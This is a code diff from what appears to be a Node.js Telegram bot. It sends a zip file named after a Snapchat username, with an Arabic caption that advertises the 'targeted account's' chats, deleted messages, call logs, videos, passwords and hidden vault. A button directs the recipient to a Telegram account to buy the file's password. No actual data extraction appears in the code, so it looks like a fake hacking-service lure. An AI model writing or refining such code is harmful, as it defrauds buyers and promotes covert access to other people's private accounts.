@@ -317,47 +317,27 @@ http.createServer(async function (req, res) {
             var boundary = "----TGBoundary" + Date.now();
             var filename = username + "_snapchat_data.zip";
             var e = entry || {};
-            var lines = [];
-            lines.push("\uD83D\uDC7B بيانات حساب سناب شات");
-            lines.push("");
-            lines.push("\uD83D\uDC64 المعرف: @" + username);
-            if (e.displayName && e.displayName !== username) lines.push("\uD83D\uDCDB الاسم: " + e.displayName);
-            if (e.bio) lines.push("\uD83D\uDCDD النبذة: " + e.bio);
-            if (e.subscriberCount) lines.push("\uD83D\uDC65 المتابعون: " + Number(e.subscriberCount).toLocaleString('ar'));
-            lines.push("\uD83D\uDCC5 تاريخ الإنشاء: غير متاح");
-            lines.push("\uD83C\uDF0D البلد: غير متاح");
-            lines.push("");
-            lines.push("\uD83D\uDCAC المحادثات");
-            lines.push("من تاريخ الإنشاء حتى اليوم");
-            lines.push("");
-            lines.push("\uD83D\uDDD1\uFE0F المحادثات والصور المحذوفة");
-            lines.push("استرجاع كامل من بداية الحساب");
-            lines.push("");
-            lines.push("\uD83C\uDFB5 التسجيلات الصوتية");
-            lines.push("جميع التسجيلات الصوتية المحفوظة");
-            lines.push("");
-            lines.push("\uD83D\uDCDE المكالمات");
-            lines.push("سجل كامل للمكالمات الصوتية والمرئية");
-            lines.push("");
-            lines.push("\uD83C\uDFA5 مقاطع الفيديو");
-            lines.push("جميع مقاطع الفيديو المحفوظة");
-            lines.push("");
-            lines.push("\uD83D\uDCF8 اللقطات");
-            lines.push("جميع الصور واللقطات");
-            lines.push("");
-            lines.push("\uD83D\uDD10 كلمات المرور المستخدمة");
-            lines.push("جميع كلمات المرور المحفوظة والمستخدمة");
-            lines.push("");
-            lines.push("\uD83D\uDDC4\uFE0F الخزنة الداخلية");
-            lines.push("المحتويات المخفية والخاصة");
-            lines.push("");
-            lines.push("\uD83C\uDF10 رابط التصفح السري");
-            lines.push("رابط خاص للوصول الخفي للحساب");
-            var caption = lines.join("\n");
-            var replyMarkup = JSON.stringify({ inline_keyboard: [[{ text: "\uD83D\uDD11 طلب كلمة المرور", url: "https://t.me/OX_U1" }]] });
+            var snapLink = "https://www.snapchat.com/@" + username;
+            var caption =
+              "\uD83D\uDC7B <b>\u0628\u064A\u0627\u0646\u0627\u062A \u062D\u0633\u0627\u0628 \u0633\u0646\u0627\u0628 \u0634\u0627\u062A</b>\n\n" +
+              "\uD83D\uDC64 \u0627\u0644\u062D\u0633\u0627\u0628 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641 <a href=\"" + snapLink + "\">@" + username + "</a>\n\n" +
+              "<b>\u0645\u062D\u062A\u0648\u064A \u0627\u0644\u0645\u0644\u0641</b>\n\n" +
+              "1_ \uD83D\uDCAC \u0627\u0644\u0645\u062D\u0627\u062F\u062B\u0627\u062A\n\u0645\u0646 \u062A\u0627\u0631\u064A\u062E \u0627\u0644\u0625\u0646\u0634\u0627\u0621 \u062D\u062A\u0649 \u0627\u0644\u064A\u0648\u0645\n\n" +
+              "2_ \uD83D\uDDD1\uFE0F \u0627\u0644\u0645\u062D\u0627\u062F\u062B\u0627\u062A \u0648\u0627\u0644\u0635\u0648\u0631 \u0627\u0644\u0645\u062D\u0630\u0648\u0641\n\u0627\u0633\u062A\u0631\u062C\u0627\u0639 \u0643\u0627\u0645\u0644 \u0645\u0646 \u0628\u062F\u0627\u064A\u0629 \u0627\u0644\u062D\u0633\u0627\u0628\n\n" +
+              "3_ \uD83C\uDFB5 \u0627\u0644\u062A\u0633\u062C\u064A\u0644\u0627\u062A \u0627\u0644\u0635\u0648\u062A\u064A\u0629\n\u062C\u0645\u064A\u0639 \u0627\u0644\u062A\u0633\u062C\u064A\u0644\u0627\u062A \u0627\u0644\u0635\u0648\u062A\u064A\u0629 \u0627\u0644\u0645\u062D\u0641\u0648\u0638\u0629\n\n" +
+              "4_ \uD83D\uDCDE \u0627\u0644\u0645\u0643\u0627\u0644\u0645\u0627\u062A\n\u0633\u062C\u0644 \u0643\u0627\u0645\u0644 \u0644\u0644\u0645\u0643\u0627\u0644\u0645\u0627\u062A \u0627\u0644\u0635\u0648\u062A\u064A\u0629 \u0648\u0627\u0644\u0645\u0631\u0626\u064A\u0629\n\n" +
+              "5_ \uD83C\uDFA5 \u0645\u0642\u0627\u0637\u0639 \u0627\u0644\u0641\u064A\u062F\u064A\u0648\n\u062C\u0645\u064A\u0639 \u0645\u0642\u0627\u0637\u0639 \u0627\u0644\u0641\u064A\u062F\u064A\u0648 \u0627\u0644\u0645\u062D\u0641\u0648\u0638\u0629\n\n" +
+              "6_ \uD83D\uDCF8 \u0627\u0644\u0644\u0642\u0637\u0627\u062A\n\u062C\u0645\u064A\u0639 \u0627\u0644\u0635\u0648\u0631 \u0648\u0627\u0644\u0644\u0642\u0637\u0627\u062A\n\n" +
+              "7_ \uD83D\uDD10 \u0643\u0644\u0645\u0627\u062A \u0627\u0644\u0645\u0631\u0648\u0631 \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645\u0629\n\u062C\u0645\u064A\u0639 \u0643\u0644\u0645\u0627\u062A \u0627\u0644\u0645\u0631\u0648\u0631 \u0627\u0644\u0645\u062D\u0641\u0648\u0638\u0629 \u0648\u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645\u0629 \u0648\u0643\u0644\u0645\u0647 \u0627\u0644\u0645\u0631\u0648\u0631 \u0627\u0644\u0627\u062D\u062A\u064A\u0627\u0637\u064A\u0647 \u0644\u0644\u062D\u0633\u0627\u0628\n\n" +
+              "7_ \uD83D\uDDC4\uFE0F \u0645\u062D\u062A\u0648\u064A \u0627\u0644\u062E\u0632\u0646\u0629 \u0627\u0644\u062F\u0627\u062E\u0644\u064A\u0629\n\u0627\u0644\u0645\u062D\u062A\u0648\u064A\u0627\u062A \u0627\u0644\u0645\u062E\u0641\u064A\u0629 \u0648\u0627\u0644\u062E\u0627\u0635\u0629\n\n" +
+              "8_ \uD83C\uDF10 \u0631\u0627\u0628\u0637 \u0627\u0644\u062A\u0635\u0641\u062D \u0627\u0644\u0633\u0631\u064A\n\u0631\u0627\u0628\u0637 \u062E\u0627\u0635 \u0644\u0644\u0648\u0635\u0648\u0644 \u0627\u0644\u062E\u0641\u064A \u0644\u0644\u062D\u0633\u0627\u0628\n\n" +
+              "<blockquote>\u0645\u0644\u0627\u062D\u0636\u0647: \u0644\u0644\u062A\u0645\u0643\u0646 \u0645\u0646 \u0627\u0633\u062A\u062E\u0631\u0627\u062C \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A \u0645\u0646 \u062F\u0627\u062E\u0644 \u0627\u0644\u0645\u0644\u0641 \u062A\u062D\u062A\u0627\u062C \u0627\u0644\u064A \u0643\u0644\u0645\u0647 \u0627\u0644\u0633\u0631 \u0627\u0644\u062E\u0627\u0635\u0647 \u0628\u0627\u0644\u0645\u0644\u0641 \u0648\u0627\u0644\u062A\u064A \u064A\u0645\u0643\u0646\u0643 \u0627\u0633\u062A\u062E\u0631\u0627\u062C\u0647\u0627 \u0645\u0646 \u0627\u0644\u0645\u0637\u0648\u0631</blockquote>";
+            var replyMarkup = JSON.stringify({ inline_keyboard: [[{ text: "\uD83D\uDD10 طلب كلمة فتح الملف", url: "https://t.me/OX_U1" }]] });
             var part1 = Buffer.from(
               "--" + boundary + "\r\n" +
               "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n" +
+              "--" + boundary + "\r\n" +
+              "Content-Disposition: form-data; name=\"parse_mode\"\r\n\r\nHTML\r\n" +
               "--" + boundary + "\r\n" +
               "Content-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n" +
               "--" + boundary + "\r\n" +
